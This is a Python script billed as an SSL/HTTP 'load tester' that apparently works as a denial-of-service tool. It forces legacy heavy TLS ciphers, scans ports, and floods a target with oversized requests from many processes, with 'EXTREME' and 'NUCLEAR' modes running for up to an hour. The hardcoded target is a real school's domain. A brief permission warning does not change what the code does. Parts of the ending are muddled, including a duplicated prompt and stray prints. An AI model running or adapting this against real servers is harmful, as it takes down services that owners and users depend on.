import ssl
import socket
import threading
import time
import random
import hashlib
import os
import multiprocessing
import psutil
import struct
import zlib
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import defaultdict
import queue

class EnhancedSSLLoadTester:
    def __init__(self, target_host, target_port=443):
        self.target_host = target_host
        self.target_port = target_port
        self.total_requests = 0
        self.failed_requests = 0
        self.bandwidth_consumed = 0
        self.stats = defaultdict(int)
        
        # Extended heavy computational ciphers for maximum CPU/memory load
        self.heavy_ciphers = [
            # Triple DES variants (very CPU intensive)
            'DES-CBC3-SHA',
            'ECDHE-RSA-DES-CBC3-SHA',
            'ECDHE-ECDSA-DES-CBC3-SHA',
            'DHE-RSA-DES-CBC3-SHA',
            'DHE-DSS-DES-CBC3-SHA',
            'PSK-3DES-EDE-CBC-SHA',
            'SRP-3DES-EDE-CBC-SHA',
            
            # Camellia ciphers (heavy processing)
            'ECDHE-RSA-CAMELLIA256-CBC-SHA384',
            'ECDHE-ECDSA-CAMELLIA256-CBC-SHA384',
            'DHE-RSA-CAMELLIA256-CBC-SHA256',
            'DHE-DSS-CAMELLIA256-CBC-SHA256',
            'CAMELLIA256-CBC-SHA256',
            'CAMELLIA128-CBC-SHA256',
            'DHE-RSA-CAMELLIA128-CBC-SHA',
            'DHE-DSS-CAMELLIA128-CBC-SHA',
            
            # ARIA ciphers (computationally intensive)
            'ECDHE-RSA-ARIA256-CBC-SHA384',
            'ECDHE-ECDSA-ARIA256-CBC-SHA384',
            'DHE-RSA-ARIA256-CBC-SHA384',
            'DHE-DSS-ARIA256-CBC-SHA384',
            'ARIA256-CBC-SHA384',
            'ARIA128-CBC-SHA256',
            
            # SEED ciphers (memory intensive)
            'SEED-CBC-SHA',
            'DHE-RSA-SEED-CBC-SHA',
            'DHE-DSS-SEED-CBC-SHA',
            
            # RC4 variants (legacy, high CPU)
            'ECDHE-RSA-RC4-SHA',
            'ECDHE-ECDSA-RC4-SHA',
            'DHE-RSA-RC4-SHA',
            'RC4-SHA',
            'RC4-MD5',
            'PSK-RC4-SHA',
            
            # Additional heavy ciphers
            'ECDHE-RSA-CAMELLIA128-CBC-SHA256',
            'ECDHE-ECDSA-CAMELLIA128-CBC-SHA256',
            'DHE-RSA-ARIA128-CBC-SHA256',
            'DHE-DSS-ARIA128-CBC-SHA256',
            'PSK-CAMELLIA256-CBC-SHA384',
            'PSK-CAMELLIA128-CBC-SHA256',
            'PSK-ARIA256-CBC-SHA384',
            'PSK-ARIA128-CBC-SHA256',
            
            # GOST ciphers if available (very heavy)
            'GOST2001-GOST89-GOST89',
            'GOST2012-GOST8912-GOST8912',
            
            # Additional legacy heavy ciphers
            'EDH-RSA-DES-CBC3-SHA',
            'EDH-DSS-DES-CBC3-SHA',
            'EXP-EDH-RSA-DES-CBC-SHA',
            'EXP-EDH-DSS-DES-CBC-SHA',
        ]
        
    def auto_detect_ssl_port(self, host):

        common_ssl_ports = [443, 8443, 9443, 8080, 8000, 3000, 5000, 6443, 10443]
        
        print(f"🔍 Auto-detecting SSL ports for {host}...")
        available_ports = []
        
        for port in common_ssl_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((host, port))
                sock.close()
                
                if result == 0:
                    # Test if it's actually SSL/TLS
                    try:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as test_sock:
                            test_sock.settimeout(5)
                            test_sock.connect((host, port))
                            ssl_sock = context.wrap_socket(test_sock, server_hostname=host)
                            ssl_sock.close()
                            
                        available_ports.append(port)
                        print(f"✅ Port {port}: SSL/TLS available")
                        
                    except ssl.SSLError:
                        print(f"⚠️  Port {port}: Open but no SSL/TLS")
                    except:
                        print(f"❌ Port {port}: Connection failed")
                else:
                    print(f"❌ Port {port}: Closed")
                    
            except Exception as e:
                print(f"❌ Port {port}: Error - {e}")
        
        return available_ports
    
    def test_alternative_protocols(self, host, port):
        """Test alternative protocols if SSL fails"""
        protocols_to_test = [
            ("HTTPS", self.test_https_connection),
            ("HTTP", self.test_http_connection),
            ("Raw TCP", self.test_tcp_connection)
        ]
        
        print(f"\n🧪 Testing alternative protocols for {host}:{port}")
        
        for protocol_name, test_func in protocols_to_test:
            try:
                result = test_func(host, port)
                if result:
                    print(f"✅ {protocol_name}: Working")
                    return protocol_name.lower()
                else:
                    print(f"❌ {protocol_name}: Failed")
            except Exception as e:
                print(f"❌ {protocol_name}: Error - {e}")
        
        return None
    
    def test_https_connection(self, host, port):
        """Test HTTPS connection"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(10)
                sock.connect((host, port))
                ssl_sock = context.wrap_socket(sock, server_hostname=host)
                ssl_sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                response = ssl_sock.recv(1024)
                ssl_sock.close()
            return len(response) > 0
        except:
            return False
    
    def test_http_connection(self, host, port):
        """Test plain HTTP connection"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(10)
                sock.connect((host, port))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                response = sock.recv(1024)
            return len(response) > 0
        except:
            return False
    
    def test_tcp_connection(self, host, port):
        """Test raw TCP connection"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(5)
                sock.connect((host, port))
                sock.send(b"HELLO\r\n")
            return True
        except:
            return False
    
    def http_load_test(self, host, port, processes=5, threads_per_process=5, duration=300):
        """HTTP load test for non-SSL targets"""
        print(f"🌐 HTTP LOAD TEST STARTING")
        print(f"Target: {host}:{port}")
        print(f"Processes: {processes}, Threads: {threads_per_process}")
        print(f"Duration: {duration} seconds")
        
        self.test_active = True
        end_time = time.time() + duration
        
        def http_worker():
            while time.time() < end_time and self.test_active:
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                        sock.settimeout(30)
                        sock.connect((host, port))
                        
                        # Generate HTTP request
                        payload = self.generate_http_payload(host)
                        sock.send(payload.encode())
                        
                        response = sock.recv(8192)
                        self.total_requests += 1
                        self.bandwidth_consumed += len(payload) + len(response)
                        
                    time.sleep(random.uniform(0.1, 0.5))
                    
                except Exception:
                    self.failed_requests += 1
                    time.sleep(1)
        
        def process_worker():
            threads = []
            for _ in range(threads_per_process):
                thread = threading.Thread(target=http_worker)
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            for thread in threads:
                thread.join()
        
        # Run load test
        with ProcessPoolExecutor(max_workers=processes) as executor:
            futures = [executor.submit(process_worker) for _ in range(processes)]
            
            start_time = time.time()
            while time.time() < end_time and self.test_active:
                elapsed = time.time() - start_time
                if elapsed % 30 == 0:
                    print(f"📊 Progress: {elapsed:.0f}s - Requests: {self.total_requests}, Failed: {self.failed_requests}")
                time.sleep(1)
            
            self.test_active = False
            
            for future in futures:
                try:
                    future.result(timeout=10)
                except:
                    pass
        
        print(f"🏁 HTTP Load test completed")
        print(f"Total requests: {self.total_requests}")
        print(f"Failed requests: {self.failed_requests}")
        print(f"Requests per second: {self.total_requests / duration:.2f}")
    
    def generate_http_payload(self, host):
        """Generate HTTP payload for non-SSL testing"""
        headers = [
            "POST /load-test HTTP/1.1",
            f"Host: {host}",
            "User-Agent: EnhancedLoadTester/2.0",
            "Accept: */*",
            "Connection: close",
            "Content-Type: application/x-www-form-urlencoded"
        ]
        
        # Add many headers for load
        for i in range(50):
            header_name = f"X-Load-Header-{i:03d}"
            header_value = hashlib.md5(f"load-test-{i}".encode()).hexdigest()
            headers.append(f"{header_name}: {header_value}")
        
        body = "data=" + "A" * 8192  # 8KB body
        headers.append(f"Content-Length: {len(body)}")
        headers.append("")
        headers.append(body)
        
        return "\r\n".join(headers)
        
    def create_ssl_context(self, cipher_suite):
        """Create SSL context with specific cipher and security settings"""
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        try:
            context.set_ciphers(cipher_suite)
        except ssl.SSLError:
            # Fallback to more permissive cipher setting
            context.set_ciphers('ALL:!aNULL:!eNULL')
        
        # Force older TLS versions for legacy cipher support
        context.minimum_version = ssl.TLSVersion.SSLv3
        context.maximum_version = ssl.TLSVersion.TLSv1_2
        
        # Additional options for maximum compatibility and load
        context.options |= ssl.OP_NO_COMPRESSION
        context.options |= ssl.OP_SINGLE_DH_USE
        context.options |= ssl.OP_SINGLE_ECDH_USE
        context.options |= ssl.OP_NO_SSLv2
        context.options |= ssl.OP_CIPHER_SERVER_PREFERENCE
        
        return context
    
    def generate_heavy_payload(self, base_size=131072):
        """Generate computationally intensive HTTP payload"""
        payload_parts = []
        
        # HTTP headers with maximum complexity
        payload_parts.append("POST /heavy-load-test HTTP/1.1")
        payload_parts.append(f"Host: {self.target_host}")
        payload_parts.append("User-Agent: EnhancedSSLLoadTester/2.0 (Heavy Load Generator)")
        payload_parts.append("Accept: */*")
        payload_parts.append("Accept-Encoding: gzip, deflate, compress, br")
        payload_parts.append("Accept-Language: en-US,en;q=0.9,*;q=0.8")
        payload_parts.append("Connection: keep-alive")
        payload_parts.append("Cache-Control: no-cache")
        payload_parts.append("Pragma: no-cache")
        
        # Generate many complex headers
        for i in range(200):
            header_name = f"X-Load-Test-Header-{i:04d}"
            # Create computationally expensive header values
            random_data = hashlib.sha512(os.urandom(1024)).hexdigest()
            compressed_data = zlib.compress(random_data.encode())
            encoded_data = hashlib.blake2b(compressed_data, digest_size=32).hexdigest()
            payload_parts.append(f"{header_name}: {encoded_data}")
        
        # Add authentication-like headers for complexity
        auth_token = hashlib.pbkdf2_hmac('sha512', os.urandom(64), os.urandom(32), 100000)
        payload_parts.append(f"Authorization: Bearer {auth_token.hex()}")
        
        # Calculate body size
        header_size = len('\r\n'.join(payload_parts))
        body_size = max(base_size - header_size - 100, 65536)
        
        payload_parts.append(f"Content-Length: {body_size}")
        payload_parts.append("Content-Type: application/x-heavy-test-data")
        payload_parts.append("Content-Encoding: identity")
        payload_parts.append("")
        
        # Generate computationally expensive body
        body_chunks = []
        chunk_count = body_size // 4096
        
        for chunk_idx in range(chunk_count):
            # Create unique, compressible but complex data
            seed_data = struct.pack('>Q', chunk_idx) * 512
            hashed_data = hashlib.sha256(seed_data).digest()
            repeated_hash = hashed_data * (4096 // len(hashed_data))
            body_chunks.append(repeated_hash[:4096])
        
        # Add remaining bytes
        remaining = body_size % 4096
        if remaining:
            final_chunk = os.urandom(remaining)
            body_chunks.append(final_chunk)
        
        payload_parts.append(b''.join(body_chunks).decode('latin-1'))
        
        return '\r\n'.join(payload_parts)
    
    def memory_stress_generator(self, size_mb=100):
        """Generate memory-intensive data structures"""
        data_structures = []
        
        # Create large dictionaries
        for i in range(10):
            large_dict = {}
            for j in range(size_mb * 100):
                key = hashlib.md5(f"{i}-{j}".encode()).hexdigest()
                value = os.urandom(1024)
                large_dict[key] = value
            data_structures.append(large_dict)
        
        # Create large lists with complex objects
        for i in range(5):
            large_list = []
            for j in range(size_mb * 50):
                complex_obj = {
                    'id': j,
                    'data': hashlib.sha512(os.urandom(512)).hexdigest(),
                    'binary': os.urandom(2048),
                    'nested': {
                        'level1': {
                            'level2': {
                                'data': os.urandom(1024)
                            }
                        }
                    }
                }
                large_list.append(complex_obj)
            data_structures.append(large_list)
        
        return data_structures
    
    def cpu_intensive_operations(self):
        """Perform CPU-intensive calculations"""
        # Prime number generation
        def generate_primes(limit):
            primes = []
            for num in range(2, limit):
                for i in range(2, int(num ** 0.5) + 1):
                    if num % i == 0:
                        break
                else:
                    primes.append(num)
            return primes
        
        # Hash chain computation
        def hash_chain(iterations=10000):
            data = os.urandom(64)
            for _ in range(iterations):
                data = hashlib.sha512(data).digest()
            return data
        
        # Matrix operations simulation
        def matrix_multiply_sim(size=100):
            import random
            matrix_a = [[random.random() for _ in range(size)] for _ in range(size)]
            matrix_b = [[random.random() for _ in range(size)] for _ in range(size)]
            result = [[0 for _ in range(size)] for _ in range(size)]
            
            for i in range(size):
                for j in range(size):
                    for k in range(size):
                        result[i][j] += matrix_a[i][k] * matrix_b[k][j]
            return result
        
        # Execute CPU intensive operations
        primes = generate_primes(1000)
        hash_result = hash_chain(5000)
        matrix_result = matrix_multiply_sim(50)
        
        return len(primes), len(hash_result), len(matrix_result)
    
    def heavy_ssl_handshake_test(self, cipher_suite, payload_size=262144):
        """Perform heavy SSL handshake test with maximum resource usage"""
        start_time = time.time()
        
        # Pre-allocate memory for stress testing
        memory_stress = self.memory_stress_generator(50)  # 50MB
        
        try:
            context = self.create_ssl_context(cipher_suite)
            
            # CPU intensive operations before connection
            cpu_results = self.cpu_intensive_operations()
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 8192)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8192)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.settimeout(60)
            
            sock.connect((self.target_host, self.target_port))
            ssl_sock = context.wrap_socket(sock, server_hostname=self.target_host)
            
            # Generate heavy payload
            payload = self.generate_heavy_payload(payload_size)
            payload_bytes = payload.encode('utf-8', errors='ignore')
            
            # Send payload in variable chunks with processing delays
            chunk_sizes = [512, 1024, 2048, 4096, 8192]
            total_sent = 0
            
            for i in range(0, len(payload_bytes), random.choice(chunk_sizes)):
                chunk_size = random.choice(chunk_sizes)
                chunk = payload_bytes[i:i+chunk_size]
                
                if chunk:
                    ssl_sock.send(chunk)
                    total_sent += len(chunk)
                    
                    # CPU intensive operation between chunks
                    hash_data = hashlib.sha256(chunk).digest()
                    compressed = zlib.compress(hash_data)
                    
                    # Variable delay for additional load
                    time.sleep(random.uniform(0.005, 0.02))
            
            # Attempt to receive response with timeout
            try:
                response = ssl_sock.recv(16384)
            except socket.timeout:
                response = b""
            except:
                response = b""
            
            ssl_sock.close()
            
            # Cleanup memory stress objects
            del memory_stress
            
            duration = time.time() - start_time
            self.total_requests += 1
            self.bandwidth_consumed += len(payload_bytes) + len(response)
            
            return {
                'cipher': cipher_suite,
                'duration': duration,
                'success': True,
                'payload_size': len(payload_bytes),
                'response_size': len(response),
                'cpu_operations': cpu_results,
                'memory_allocated': 50 * 1024 * 1024  # 50MB
            }
            
        except Exception as e:
            duration = time.time() - start_time
            self.failed_requests += 1
            
            # Cleanup on error
            try:
                del memory_stress
            except:
                pass
            
            return {
                'cipher': cipher_suite,
                'duration': duration,
                'success': False,
                'error': str(e)
            }
    
    def extreme_load_test(self, cipher_suite, processes=20, threads_per_process=10, duration=600):
        """Run extreme load test with maximum resource utilization"""
        print(f"🔥 EXTREME LOAD TEST STARTING 🔥")
        print(f"Cipher: {cipher_suite}")
        print(f"Processes: {processes}")
        print(f"Threads per process: {threads_per_process}")
        print(f"Total concurrent connections: {processes * threads_per_process}")
        print(f"Duration: {duration} seconds")
        print(f"Target: {self.target_host}:{self.target_port}")
        
        self.test_active = True
        end_time = time.time() + duration
        
        def extreme_process_worker(process_id):
            """Worker process with maximum resource usage"""
            process_requests = 0
            process_memory = []
            
            def extreme_thread_worker():
                nonlocal process_requests
                thread_memory = self.memory_stress_generator(20)  # 20MB per thread
                
                while time.time() < end_time and self.test_active:
                    try:
                        # Variable payload sizes for different load patterns
                        payload_size = random.randint(131072, 524288)  # 128KB - 512KB
                        
                        result = self.heavy_ssl_handshake_test(cipher_suite, payload_size)
                        process_requests += 1
                        
                        # Additional CPU load between requests
                        self.cpu_intensive_operations()
                        
                        # Variable sleep for realistic load patterns
                        time.sleep(random.uniform(0.05, 0.2))
                        
                    except Exception as e:
                        print(f"Thread error in process {process_id}: {e}")
                        time.sleep(1)
                
                del thread_memory
            
            # Start threads for this process
            threads = []
            for t in range(threads_per_process):
                thread = threading.Thread(target=extreme_thread_worker)
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            # Monitor process statistics
            process_start = time.time()
            while time.time() < end_time and self.test_active:
                time.sleep(5)
                elapsed = time.time() - process_start
                print(f"Process {process_id}: {process_requests} requests in {elapsed:.1f}s")
            
            # Wait for threads to complete
            for thread in threads:
                thread.join(timeout=10)
            
            return process_requests
        
        # Start monitoring
        start_time = time.time()
        initial_memory = psutil.Process().memory_info().rss / 1024 / 1024  # MB
        
        print(f"Initial memory usage: {initial_memory:.1f} MB")
        print(f"Available CPU cores: {multiprocessing.cpu_count()}")
        
        # Launch processes
        with ProcessPoolExecutor(max_workers=processes) as executor:
            futures = [executor.submit(extreme_process_worker, i) for i in range(processes)]
            
            # Monitor progress
            last_report = 0
            while time.time() < end_time and self.test_active:
                elapsed = time.time() - start_time
                
                if elapsed - last_report >= 30:  # Report every 30 seconds
                    current_memory = psutil.Process().memory_info().rss / 1024 / 1024
                    cpu_percent = psutil.cpu_percent(interval=1)
                    
                    print(f"\n📊 PROGRESS REPORT - {elapsed:.0f}s elapsed")
                    print(f"Total requests: {self.total_requests}")
                    print(f"Failed requests: {self.failed_requests}")
                    print(f"Success rate: {((self.total_requests - self.failed_requests) / max(1, self.total_requests)) * 100:.1f}%")
                    print(f"Memory usage: {current_memory:.1f} MB (+{current_memory - initial_memory:.1f} MB)")
                    print(f"CPU usage: {cpu_percent:.1f}%")
                    print(f"Bandwidth consumed: {self.bandwidth_consumed / 1024 / 1024:.1f} MB")
                    
                    last_report = elapsed
                
                time.sleep(1)
            
            # Stop test and collect results
            self.test_active = False
            print("\n🛑 Stopping extreme load test...")
            
            total_process_requests = 0
            for future in futures:
                try:
                    result = future.result(timeout=30)
                    total_process_requests += result
                except Exception as e:
                    print(f"Process completion error: {e}")
        
        final_memory = psutil.Process().memory_info().rss / 1024 / 1024
        
        print(f"\n🏁 EXTREME LOAD TEST COMPLETED")
        print(f"Duration: {duration} seconds")
        print(f"Total requests: {self.total_requests}")
        print(f"Failed requests: {self.failed_requests}")
        print(f"Requests per second: {self.total_requests / duration:.2f}")
        print(f"Memory consumed: {final_memory - initial_memory:.1f} MB")
        print(f"Total bandwidth: {self.bandwidth_consumed / 1024 / 1024:.1f} MB")
        
        return {
            'total_requests': self.total_requests,
            'failed_requests': self.failed_requests,
            'duration': duration,
            'rps': self.total_requests / duration,
            'memory_consumed': final_memory - initial_memory,
            'bandwidth_consumed': self.bandwidth_consumed
        }
    
    def cipher_benchmark_suite(self):
        """Run comprehensive benchmark across all heavy ciphers"""
        print("🚀 COMPREHENSIVE CIPHER BENCHMARK SUITE")
        print(f"Testing {len(self.heavy_ciphers)} heavy computational ciphers")
        
        results = {}
        
        for i, cipher in enumerate(self.heavy_ciphers, 1):
            print(f"\n{'='*60}")
            print(f"CIPHER {i}/{len(self.heavy_ciphers)}: {cipher}")
            print(f"{'='*60}")
            
            try:
                # Reset counters for this cipher
                self.total_requests = 0
                self.failed_requests = 0
                self.bandwidth_consumed = 0
                
                # Run intensive test for this cipher
                result = self.extreme_load_test(
                    cipher_suite=cipher,
                    processes=min(8, multiprocessing.cpu_count()),
                    threads_per_process=5,
                    duration=180  # 3 minutes per cipher
                )
                
                results[cipher] = result
                
                print(f"✅ {cipher} completed: {result['rps']:.2f} RPS")
                
                # Cooling period between ciphers
                print("❄️  Cooling down for 30 seconds...")
                time.sleep(30)
                
            except Exception as e:
                print(f"❌ {cipher} failed: {e}")
                results[cipher] = {'error': str(e)}
        
        # Print benchmark summary
        print(f"\n{'='*80}")
        print("BENCHMARK SUMMARY")
        print(f"{'='*80}")
        
        successful_tests = [(k, v) for k, v in results.items() if 'error' not in v]
        successful_tests.sort(key=lambda x: x[1].get('rps', 0), reverse=True)
        
        print(f"{'Cipher':<40} {'RPS':<10} {'Memory':<10} {'Bandwidth':<10}")
        print(f"{'-'*70}")
        
        for cipher, result in successful_tests:
            rps = result.get('rps', 0)
            memory = result.get('memory_consumed', 0)
            bandwidth = result.get('bandwidth_consumed', 0) / 1024 / 1024
            print(f"{cipher:<40} {rps:<10.2f} {memory:<10.1f} {bandwidth:<10.1f}")
        
        return results

if __name__ == "__main__":
    print("🔥 ENHANCED SSL LOAD TESTING TOOL 🔥")
    print("Extreme SSL/TLS performance testing with heavy computational load")
    print("=" * 80)
    
    # KONFIGURASI TARGET - GANTI SESUAI KEBUTUHAN
    TARGET_HOST = "smansatugerokgak.sch.id"  # Testing service yang reliable
    TARGET_PORT = 443   # HTTP port (gunakan 80 untuk HTTP, 443 untuk HTTPS)
    
    # Contoh konfigurasi lain:
    # TARGET_HOST = "google.com"; TARGET_PORT = 443      # HTTPS
    # TARGET_HOST = "example.com"; TARGET_PORT = 80      # HTTP  
    # TARGET_HOST = "httpbin.org"; TARGET_PORT = 443     # HTTPS testing service
    # TARGET_HOST = "postman-echo.com"; TARGET_PORT = 443 # API testing service
    
    print(f"🎯 Target: {TARGET_HOST}:{TARGET_PORT}")
    print(f"💻 Available CPU cores: {multiprocessing.cpu_count()}")
    print(f"🧠 Available memory: {psutil.virtual_memory().total / 1024 / 1024 / 1024:.1f} GB")
    
    # AUTO-DETECTION DAN VALIDASI
    tester = EnhancedSSLLoadTester(TARGET_HOST, TARGET_PORT)
    
    print(f"\n🔍 Step 1: Testing basic connectivity...")
    try:
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_sock.settimeout(10)
        result = test_sock.connect_ex((TARGET_HOST, TARGET_PORT))
        test_sock.close()
        
        if result == 0:
            print(f"✅ Basic connectivity OK: {TARGET_HOST}:{TARGET_PORT}")
        else:
            print(f"❌ Cannot connect to {TARGET_HOST}:{TARGET_PORT}")
            print(f"🔍 Trying to find alternative ports...")
            
            available_ports = tester.auto_detect_ssl_port(TARGET_HOST)
            
            if available_ports:
                print(f"✅ Found SSL ports: {available_ports}")
                TARGET_PORT = available_ports[0]
                print(f"🔄 Switching to port {TARGET_PORT}")
            else:
                print(f"❌ No SSL ports found. Trying alternative protocols...")
                protocol = tester.test_alternative_protocols(TARGET_HOST, TARGET_PORT)
                
                if not protocol:
                    print(f"❌ Target {TARGET_HOST} is not accessible")
                    print("💡 Try these alternatives:")
                    print("   - httpbin.org (port 80 or 443)")
                    print("   - postman-echo.com (port 443)")  
                    print("   - example.com (port 80)")
                    exit(1)
                    
    except Exception as e:
        print(f"❌ Connection test failed: {e}")
        exit(1)
    
    # Test protocol yang akan digunakan
    print(f"\n🧪 Step 2: Testing protocol compatibility...")
    if TARGET_PORT == 443:
        protocol_test = tester.test_https_connection(TARGET_HOST, TARGET_PORT)
        protocol_type = "HTTPS/SSL"
    else:
        protocol_test = tester.test_http_connection(TARGET_HOST, TARGET_PORT)  
        protocol_type = "HTTP"
    
    if protocol_test:
        print(f"✅ {protocol_type} protocol working on port {TARGET_PORT}")
    else:
        print(f"⚠️  {protocol_type} test failed, but will try load testing anyway...")
    
    # Update tester dengan port yang benar
    tester = EnhancedSSLLoadTester(TARGET_HOST, TARGET_PORT)
    
    print("\n⚠️  WARNING: This tool generates EXTREME computational load!")
    print("   - High CPU usage across all cores")
    print("   - Significant memory consumption")
    print("   - Heavy network traffic")
    print("   - Only use on servers you own or have explicit permission to test!")
    
    confirm = input("\nType 'EXTREME CONFIRM' to proceed: ")
    
    if confirm == "EXTREME CONFIRM":
        tester = EnhancedSSLLoadTester(TARGET_HOST)
        
        print("\n🎯 Select test intensity:")
        print("1. Single heavy handshake test")
        print("2. Medium load test (10 min, moderate resources)")
        print("3. Heavy load test (20 min, high resources)")
        print("4. EXTREME load test (30 min, maximum resources)")
        print("5. NUCLEAR test (60 min, all available resources)")
        print("6. Complete cipher benchmark suite (4+ hours)")
        
        choice = input("\nChoose intensity level (1-6): ")
        
    if confirm == "EXTREME CONFIRM":
        print(f"\n🎯 Select test type for {TARGET_HOST}:{TARGET_PORT}:")
        
        if TARGET_PORT == 443:
            print("SSL/HTTPS Load Testing Options:")
            print("1. Single heavy SSL handshake test")
            print("2. Medium SSL load test (10 min, moderate resources)")
            print("3. Heavy SSL load test (20 min, high resources)")
            print("4. EXTREME SSL load test (30 min, maximum resources)")
            print("5. NUCLEAR SSL test (60 min, all available resources)")
            print("6. Complete SSL cipher benchmark suite (4+ hours)")
        else:
            print("HTTP Load Testing Options:")
            print("1. Single HTTP request test")
            print("2. Medium HTTP load test (10 min, moderate resources)")
            print("3. Heavy HTTP load test (20 min, high resources)")
            print("4. EXTREME HTTP load test (30 min, maximum resources)")
            print("5. NUCLEAR HTTP test (60 min, all available resources)")
            print("6. Mixed protocol testing")
        
        choice = input(f"\nChoose test type (1-6): ")
        
        if choice == "1":
            if TARGET_PORT == 443:
                cipher = 'ECDHE-RSA-DES-CBC3-SHA'
                print(f"Testing single SSL handshake with {cipher}")
                result = tester.heavy_ssl_handshake_test(cipher, 262144)
                print(f"Result: {result}")
            else:
                print("Testing single HTTP request")
                result = tester.test_http_connection(TARGET_HOST, TARGET_PORT)
                print(f"HTTP test result: {result}")
            
        elif choice == "2":
            if TARGET_PORT == 443:
                cipher = 'ECDHE-RSA-CAMELLIA256-CBC-SHA384'
                tester.extreme_load_test(cipher, processes=4, threads_per_process=3, duration=600)
            else:
                tester.http_load_test(TARGET_HOST, TARGET_PORT, processes=4, threads_per_process=3, duration=600)
            
        elif choice == "3":
            if TARGET_PORT == 443:
                cipher = 'DHE-RSA-ARIA256-CBC-SHA384'
                tester.extreme_load_test(cipher, processes=8, threads_per_process=5, duration=1200)
            else:
                tester.http_load_test(TARGET_HOST, TARGET_PORT, processes=8, threads_per_process=5, duration=1200)
            
        elif choice == "4":
            if TARGET_PORT == 443:
                cipher = 'ECDHE-ECDSA-DES-CBC3-SHA'
                max_processes = min(16, multiprocessing.cpu_count())
                tester.extreme_load_test(cipher, processes=max_processes, threads_per_process=8, duration=1800)
            else:
                max_processes = min(16, multiprocessing.cpu_count())
                tester.http_load_test(TARGET_HOST, TARGET_PORT, processes=max_processes, threads_per_process=8, duration=1800)
            
        elif choice == "5":
            nuclear_confirm = input("⚡ Type 'NUCLEAR CONFIRM' for maximum load: ")
            if nuclear_confirm == "NUCLEAR CONFIRM":
                if TARGET_PORT == 443:
                    cipher = 'DES-CBC3-SHA'
                    max_processes = multiprocessing.cpu_count()
                    tester.extreme_load_test(cipher, processes=max_processes, threads_per_process=12, duration=3600)
                else:
                    max_processes = multiprocessing.cpu_count()
                    tester.http_load_test(TARGET_HOST, TARGET_PORT, processes=max_processes, threads_per_process=12, duration=3600)
            else:
                print("Nuclear test cancelled")
                
        elif choice == "6":
            if TARGET_PORT == 443:
                suite_confirm = input("🏁 Type 'BENCHMARK SUITE CONFIRM' to start: ")
                if suite_confirm == "BENCHMARK SUITE CONFIRM":
                    tester.cipher_benchmark_suite()
                else:
                    print("Benchmark suite cancelled")
            else:
                print("🔄 Mixed Protocol Testing")
                
                available_ports = tester.auto_detect_ssl_port(TARGET_HOST)
                for port in [80, 443] + available_ports:
                    if port != TARGET_PORT:
                        print(f"Testing port {port}...")
                        temp_tester = EnhancedSSLLoadTester(TARGET_HOST, port)
                        if port == 443:
                            temp_tester.extreme_load_test('ECDHE-RSA-AES128-GCM-SHA256', processes=2, threads_per_process=2, duration=300)
                        else:
                            temp_tester.http_load_test(TARGET_HOST, port, processes=2, threads_per_process=2, duration=300)
        
        else:
            print("")
    
    else:
        print("y")
        print("ya")
        print("uh")
